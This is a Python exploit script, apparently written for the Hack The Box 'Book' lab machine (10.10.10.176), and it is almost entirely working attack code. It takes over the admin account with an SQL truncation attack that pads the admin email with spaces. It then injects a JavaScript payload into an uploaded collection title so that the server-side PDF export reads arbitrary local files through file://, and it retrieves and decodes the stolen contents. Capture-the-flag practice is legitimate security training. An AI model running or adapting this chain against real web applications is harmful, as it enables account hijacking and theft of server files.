#!/usr/bin/python3
import requests
import random
import string
import urllib
import slate3k as slate
import base64

def grabSessionCookie():
    url = "http://10.10.10.176"
    r = requests.get(url)
    return r.headers['Set-Cookie']

def overwriteAdminCreds(password, cookie):
    email = "admin@book.htb" + " " * 50 + "junk"
    res = signupUser(cookie, 'admin', email, password)
    return res

def signupUser(cookie, user = 'test', email = 'teta@teta.com', password = 'test'):
    while True:
        url = "http://10.10.10.176"
        postReq = { 'name': user, 'email': email, 'password': password }
        #r = requests.post(url, data = postReq, cookies = cookie, proxies = { 'http': '127.0.0.1:8080' })
        r = requests.post(url, data = postReq, cookies = cookie)
        if(r.text.find('User Exits!') == -1):
            break
        else:
            if(email.strip() == 'admin@book.htb'):
                return -1
            randomMailProvider = ''.join(random.choice(string.ascii_lowercase) for i in range(8))
        email = "test@" + randomMailProvider
    return email, password

def loginAdmin(password, cookie):
    email = "admin@book.htb"    
    url = 'http://10.10.10.176/admin/index.php'
    postReq = { 'email': email, 'password': password }
    #r = requests.post(url, data = postReq, cookies = cookie, proxies = { 'http': '127.0.0.1:8080' })
    r = requests.post(url, data = postReq, cookies = cookie)
    if(r.text.find('Nope!') == -1):
        url = 'http://10.10.10.176/admin/home.php'
        home = requests.get(url, cookies = cookie)
        return home.text
    else: 
        print('[*] Login as an admin failed! Trying to overwrite admin credentials with sql truncation attack...');
        overwriteAdminCreds(password, cookie)
        #url = 'http://10.10.10.176/admin/home.php'
        #home = requests.get(url, cookies = cookie) 
        print('[+] Admin credentials successfully overwrited!')
        loginAdmin(password, cookie)

def loginUser(email, password, cookie):
    url = 'http://10.10.10.176/index.php'
    postReq = { 'email': email, 'password': password }
    r = requests.post(url, data = postReq, cookies = cookie)
    url = 'http://10.10.10.176/home.php'
    home = requests.get(url, cookies = cookie)
    return home.text

def uploadCollection(title, cookie, filename):
    url = "http://10.10.10.176/collections.php"
    author = "test"
    files = [
        ("title", (None, title)),
        ("author", (None, author)),
        ("Upload", (filename, open(filename, 'rb'), 'application/pdf')),
        ("Upload", (None, "Upload"))
    ]
    #res = requests.post(url, files = files, proxies = { 'http' : 'http://127.0.0.1:8080' }, cookies = cookie)
    res = requests.post(url, files = files, cookies = cookie)
    if(res.text.find('Thanks') != -1):
        return 0
    else:
        return -1

def exportCollectionsPdf(cookie):
    path = '/tmp/12345.pdf'
    url = 'http://10.10.10.176/admin/collections.php?type=collections'
    r = requests.get(url, cookies = cookie, allow_redirects=True)
    open(path, 'wb').write(r.content)
    
    return path

def readPdf(filename):
    with open(filename, 'rb') as f:
        doc = slate.PDF(f)
    try:
        b64Pdf = doc[0].strip()
        missing_padding = len(b64Pdf) % 4
        if missing_padding:
            b64Pdf += '='* (4 - missing_padding)
        print(base64.b64decode(b64Pdf).decode())
    except:
        pass

sessionCookieUser = { 'PHPSESSID' : None }
sessionCookieUser['PHPSESSID'] = grabSessionCookie()[:-9].split('=')[-1]
print(f"[+] Session Cookie for user grabbed: {sessionCookieUser['PHPSESSID']}")
email, password = signupUser(sessionCookieUser)
print(f"Email {email} registered with password: {password}!")
loginUser(email, password, sessionCookieUser)
filename = input("readfile> ")
xssPayload = f'''
<script>
    x = new XMLHttpRequest;
    x.onload = function() {{
        body = btoa(this.response);
        document.write(body);
    }};
    x.open("GET", "file://{filename}");
    x.send();
</script>'''
print("Injecting the file in the last PDF...")
sessionCookieAdmin = { 'PHPSESSID' : None }
sessionCookieAdmin['PHPSESSID'] = grabSessionCookie()[:-9].split('=')[-1]
print(f"[+] Session Cookie for admin grabbed: {sessionCookieAdmin['PHPSESSID']}")
loginAdmin("newpassword", sessionCookieAdmin)
filename = exportCollectionsPdf(sessionCookieAdmin)
res = uploadCollection(xssPayload, sessionCookieUser, filename)
if(res == 0):
    print("[+] File injected in the last PDF, go and export it to read the file!")
    filename = exportCollectionsPdf(sessionCookieAdmin)
    readPdf(filename)
else:
    print("[-] Something has gone wrong!")
